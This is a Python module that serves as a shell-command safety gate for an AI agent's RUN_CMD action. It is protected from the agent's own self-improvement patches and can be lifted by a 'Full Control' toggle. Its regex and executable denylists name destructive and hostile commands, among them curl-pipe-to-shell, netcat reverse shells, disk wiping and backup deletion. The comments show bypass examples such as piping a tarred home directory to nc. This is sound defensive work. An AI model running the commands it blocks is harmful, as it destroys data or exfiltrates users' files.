"""Centralised shell-command safety gate.

Extracted verbatim from the inline RUN_CMD handler in ``executor_enhanced.py`` so the
destructive-pattern + dangerous-executable denylist lives in ONE small, *protected*
module instead of buried in a 14k-line file — where a self-improvement patch could
quietly strip it. ``self_improvement.apply_code_patch`` lists this file in its
protected-path set, so the self-modifier can never auto-edit the shell denylist.

Behaviour is identical to the previous inline gate:
  - ELI Full Control (the GUI toggle, default off) lifts the hard safety floor — when
    on, the destructive-pattern block and the executable denylist both step aside.
  - Otherwise, a destructive command pattern OR a denylisted ``argv[0]`` is refused.

100% local, deterministic, never raises. ``check_command`` returns a block-result
dict (the caller adds ``action``) when the command must be refused, else ``None``.
"""
from __future__ import annotations

import logging
import os
import re
import shlex
from typing import Any, Dict, Optional, Sequence, Union

log = logging.getLogger(__name__)

# ── Destructive / dangerous command patterns — block outright ──
_BLOCKED_PATTERNS = [
    r"\brm\s+(-[rf]+\s+)?/(?!tmp)",            # rm -rf / (except /tmp)
    r"\bmkfs\b",                                # format filesystem
    r"\bdd\s+.*of=/dev/",                       # dd to raw device
    r"\bchmod\s+777\s+/",                       # chmod 777 on root
    r"\b:\(\)\s*\{.*\}",                        # fork bomb
    r"\bshutdown\b|\breboot\b|\bpoweroff\b",    # system power control
    r"\bcurl\b.*\|\s*(?:ba)?sh\b",              # curl | bash (remote exec)
    r"\bwget\b.*\|\s*(?:ba)?sh\b",              # wget | bash
    r"\b/dev/sd[a-z]\b",                        # raw disk device access
    r"\biptables\s+-F\b",                       # flush firewall rules
    r"\bmv\s+/\S",                              # mv files from root
    r"\b(?:bash|sh|zsh|ksh|fish|dash)\s+-c\b",  # shell -c arbitrary exec
    r"\bpython\d*\s+-c\b",                      # python -c arbitrary exec
    r"\bperl\s+-e\b",                           # perl -e arbitrary exec
    r"\bruby\s+-e\b",                           # ruby -e arbitrary exec
    r"\bnc\b.*-e\b",                            # netcat reverse shell
    r"\b(?:ncat|netcat)\b.*-e\b",               # netcat variants
    r">\s*/etc/",                               # redirect to system config
    r">\s*/boot/",                              # redirect to boot partition
    r"\bchpasswd\b|\bpasswd\b\s+\w",           # password change
    r"\bvisudo\b|\bsudoers\b",                  # sudoers modification
    r"\bcrontab\s+-[re]\b",                     # crontab modification
    # Windows: the same harm in its own words (until 2.5.17 the gate knew only POSIX commands)
    r"\b(?:del|erase)\b.*\s/s\b",                # recursive delete
    r"\b(?:rd|rmdir)\b.*\s/s\b",                 # recursive directory removal
    r"\bformat(?:\.com)?\s+[a-z]:",              # format a drive
    r"\bremove-item\b.*-recurse\b",              # PowerShell recursive delete
    r"\breg(?:\.exe)?\s+delete\b",               # registry deletion
    r"\bvssadmin\b.*\bdelete\b",                # shadow copies (backups) deleted
    r"\bwbadmin\b.*\bdelete\b",                 # backups deleted
    r"\bbcdedit\b",                              # boot configuration
    r"\bcipher(?:\.exe)?\s+/w\b",                # wipe free space
    r"\b(?:invoke-expression|iex)\b",            # PowerShell arbitrary exec
    r"\b(?:cmd|powershell|pwsh)(?:\.exe)?\s+(?:/[ck]\b|-c(?:ommand)?\b|-enc)",  # shell -c arbitrary exec
    r">\s*[a-z]:\\windows\\",                     # redirect into the Windows folder
    # macOS
    r"\bdiskutil\s+(?:erase|zerodisk|secureerase|partitiondisk|reformat)",  # erase a disk
    r"\bcsrutil\s+disable\b",                    # system integrity protection off
    r"\bspctl\s+--master-disable\b",             # Gatekeeper off
]

# ── Denylisted executable names as argv[0] ──
_DENIED_EXECUTABLES = {
    "bash", "sh", "zsh", "ksh", "fish", "dash",  # shell interpreters
    "python", "python3", "python2",              # scripting engines
    "perl", "ruby", "node", "nodejs",            # more scripting engines
    "nc", "ncat", "netcat",                      # network tools
    "dd", "mkfs", "fdisk", "parted",             # disk tools
    "rm", "shred", "wipe",                       # destructive file ops
    "iptables", "ip6tables", "nftables",         # firewall manipulation
    # Windows
    "cmd", "powershell", "pwsh",                 # shell interpreters
    "cscript", "wscript", "mshta",               # scripting engines
    "diskpart", "format",                        # disk tools
    "bcdedit", "vssadmin", "wbadmin",            # boot config, backups
    # macOS
    "osascript",                                 # scripting engine
}


def _full_control() -> bool:
    try:
        from eli.core.full_control import is_full_control
        return bool(is_full_control())
    except Exception:
        return False


def _blocked_result(msg: str) -> Dict[str, Any]:
    return {"ok": False, "error": "security_blocked",
            "content": msg, "response": msg, "blocked": True}


# Commands that run the command after them: the one that matters is what they run. Each maps to
# (how many plain words after its options are its own, e.g. timeout's duration; the options of it
# that take the next word as their value, e.g. "sudo -u alex", "nice -n 5").
_WRAPPERS = {
    "sudo": (0, {"-u", "-g", "-p", "-C", "-r", "-t", "-U", "-D", "-h", "--user", "--group", "--prompt",
                 "--role", "--type", "--close-from", "--chdir", "--host", "--other-user"}),
    "doas": (0, {"-u", "-C"}),
    "env": (0, {"-u", "-C", "--unset", "--chdir"}),
    "nice": (0, {"-n", "--adjustment"}),
    "nohup": (0, set()),
    "timeout": (1, {"-s", "-k", "--signal", "--kill-after"}),
    "command": (0, set()),
    "exec": (0, {"-a"}),
    "builtin": (0, set()),
    "xargs": (0, {"-I", "-L", "-n", "-P", "-d", "-E", "-s", "-a", "--max-args", "--max-procs", "--delimiter",
                  "--arg-file", "--replace", "--max-lines", "--eof"}),
    "busybox": (0, set()),
    "stdbuf": (0, {"-i", "-o", "-e", "--input", "--output", "--error"}),
    "setsid": (0, set()),
    "time": (0, {"-f", "-o", "--format", "--output"}),
    "ionice": (0, {"-c", "-n", "-p", "-P", "-u", "--class", "--classdata", "--pid", "--pgid", "--uid"}),
    "chrt": (1, set()),
    "taskset": (1, set()),
    "unbuffer": (0, set()),
    "caffeinate": (0, {"-t", "-w"}),
    "start": (0, set()),
    "then": (0, set()), "do": (0, set()), "else": (0, set()), "!": (0, set()), "{": (0, set()),
}
# What separates one command from the next in a line: ; && || | & newlines, and the commands run
# inside $( ), <( ), >( ) and backticks.
_SEPARATORS = re.compile(r"\$\(|[<>]\(|`|\r?\n")
_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*")


def _commands_in(line: str) -> list:
    """Each simple command a shell line runs, as its words: "ls; rm -rf ~" is two commands, and
    the gate looked only at the first word of the line."""
    # Windows paths keep their backslashes: C:\\Windows\\System32\\cmd.exe is cmd.
    lexer = shlex.shlex(_SEPARATORS.sub(" ; ", line), posix=os.name != "nt", punctuation_chars=";&|()<>")
    lexer.whitespace_split = True
    commands, words = [], []
    try:
        for tok in lexer:
            if tok and set(tok) <= set(";&|()<>"):
                if words:
                    commands.append(words)
                words = []
            else:
                words.append(tok)
    except ValueError:                  # unbalanced quotes: judge the words read so far
        log.debug("shell line with unbalanced quotes: judging the words read so far")
    if words:
        commands.append(words)
    return commands


def _what_runs(words: list) -> list:
    """The command a wrapper runs: "sudo -u root nice -n 5 rm -rf ~" runs rm, and
    "env -S 'rm -rf ~'" runs what its string says."""
    i = 0
    while i < len(words):
        w = words[i]
        base = re.split(r"[\\/]", w)[-1].lower()
        if _ASSIGNMENT.fullmatch(w):                      # VAR=value before the command
            i += 1
            continue
        if base not in _WRAPPERS:
            return words[i:]
        own, takes_value = _WRAPPERS[base]
        i += 1
        while i < len(words) and (words[i].startswith("-") or own or _ASSIGNMENT.fullmatch(words[i])):
            opt = words[i]
            if base == "env" and (opt in ("-S", "--split-string") or opt.startswith("--split-string=")):
                line = opt.split("=", 1)[1] if "=" in opt else (words[i + 1] if i + 1 < len(words) else "")
                line = line.strip().strip("\"'")   # Windows lexing keeps the quotes round the string
                rest = words[i + (1 if "=" in opt else 2):]
                return _what_runs([w for part in _commands_in(line) for w in part] + rest)
            if opt.startswith("-"):
                i += 2 if opt in takes_value else 1
            elif own:
                own -= 1
                i += 1
            else:
                i += 1
    return []


def _refused_part(words: list) -> Optional[str]:
    """Why one simple command is refused, or None."""
    run = _what_runs(words)
    if not run:
        return None
    base = re.sub(r"\.(?:exe|com|bat|cmd)$", "", re.split(r"[\\/]", run[0].strip('"\''))[-1].lower())
    if base in _DENIED_EXECUTABLES:
        return base
    low = [w.lower() for w in run]
    if base == "find" and ("-delete" in low or any(
            w in ("-exec", "-execdir", "-ok", "-okdir") and i + 1 < len(low)
            and re.split(r"[\\/]", low[i + 1])[-1] in _DENIED_EXECUTABLES for i, w in enumerate(low))):
        return "find"
    return None


def check_command(cmd: Union[str, Sequence[Any]],
                  full_control: Optional[bool] = None) -> Optional[Dict[str, Any]]:
    """Evaluate a shell command against the safety denylist.

    Returns a block-result dict (caller should set ``["action"]``) when the command
    must be refused, otherwise ``None``. ``full_control=None`` queries the live toggle.
    """
    # When cmd is a list, join to a string for pattern matching so that
    # ["bash", "-c", "..."] cannot bypass regex checks via str(list) repr.
    if isinstance(cmd, (list, tuple)):
        cmd_str = " ".join(str(x) for x in cmd)
    else:
        cmd_str = str(cmd)
    cmd_low = cmd_str.lower().strip()

    fc = _full_control() if full_control is None else bool(full_control)
    if fc:
        return None  # Full Control lifts the hard safety floor

    for pat in _BLOCKED_PATTERNS:
        if re.search(pat, cmd_low):
            return _blocked_result(f"Blocked dangerous command: {cmd_str[:60]}")

    # Every command the line runs, not only its first word: "ls; rm -rf ~", "ls $(rm -rf ~)",
    # "sudo rm -rf ~" and "tar cf - ~ | nc host 9" all got through when only argv[0] was read.
    # An argv list is one command (no shell reads it), so only its own words are judged.
    try:
        parts = [[str(x) for x in cmd]] if isinstance(cmd, (list, tuple)) else _commands_in(cmd_str)
    except Exception:
        parts = []
    for words in parts:
        refused = _refused_part(words)
        if refused:
            return _blocked_result(
                f"Execution of '{refused}' is not permitted via RUN_CMD for security reasons.")

    return None
